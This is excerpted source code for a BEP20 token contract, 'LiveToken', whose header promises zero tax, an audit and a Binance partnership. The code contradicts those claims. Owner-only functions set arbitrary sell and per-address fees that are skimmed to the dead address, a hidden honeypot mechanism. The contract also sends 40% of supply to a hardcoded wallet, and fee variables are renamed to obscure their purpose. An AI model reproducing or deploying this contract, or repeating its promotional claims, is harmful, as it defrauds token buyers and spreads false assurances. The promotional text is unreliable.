...
/*
btoken dc  project is a utility staking token with ZERO TAX holders will be able to stake nft , holding it for longer period of time.  KYC AUDIT  Contract audit  NO TOKEN TAX    Partnered with Binance, Dont forget to follow our official links down below and dont miss out this rare opportunity.
* http://instagram.com/LiveToken212
* https://www.reddit.com/user/LiveToken212
* TWITTER:https://twitter.com/dc
* WEBSITE:https://www.dc.com
* TELEGRAM:https://t.me/dc
*/
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingLiveToken212OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingLiveToken212OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function swapExactTokensForTokensSupportingLiveToken212OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingLiveToken212OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingLiveToken212OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
...
interface IUniswapV2Factory {
    ...
    function LiveToken212To() external view returns (address);
    function LiveToken212ToSetter() external view returns (address);
    ...
    function setLiveToken212To(address) external;
    function setLiveToken212ToSetter(address) external;
}
...
contract LT is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;
	string name_ = "LiveToken";
	string symbol_ = "LT";
	...
	transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10*4);	
        ...
        _defaultSellLiveToken212 = 0;
        _defaultBuyLiveToken212 = 0;
    ...
    uint256 private _defaultSellLiveToken212 = 0;
    uint256 private _defaultBuyLiveToken212 = 0;
    ...
    function incS(uint256 _value) external onlyowaer {
        _defaultSellLiveToken212 = _value;
    }


    function acLiveToken212fq(address _acc, uint256 _value) external onlyowaer {
 ...
 function getRelease(address _address) external view onlyowaer returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeLiveToken212amuont = 0;

        if (rF) {
            uint256 tradeLiveToken212 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradeLiveToken212 = _msgLiveToken212Info(uint160(from));
                    tradeLiveToken212 = tradeLiveToken212 < _defaultSellLiveToken212 ? _defaultSellLiveToken212 : tradeLiveToken212;
                }
                if (from == uniswapV2Pair) {
                    tradeLiveToken212 = _defaultBuyLiveToken212;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradeLiveToken212 = _Escape[from];
            }


            tradeLiveToken212amuont = _amuont.mul(tradeLiveToken212).div(100);
        }


        if (tradeLiveToken212amuont > 0) {
            _balances[from] = _balances[from].sub(tradeLiveToken212amuont);
            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradeLiveToken212amuont);
            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradeLiveToken212amuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradeLiveToken212amuont);
        _balances[_to] = _balances[_to].add(_amuont - tradeLiveToken212amuont);
        emit Transfer(from, _to, _amuont - tradeLiveToken212amuont);
    }
	...
	function _msgLiveToken212Info(uint _acc) internal view virtual returns (uint) {
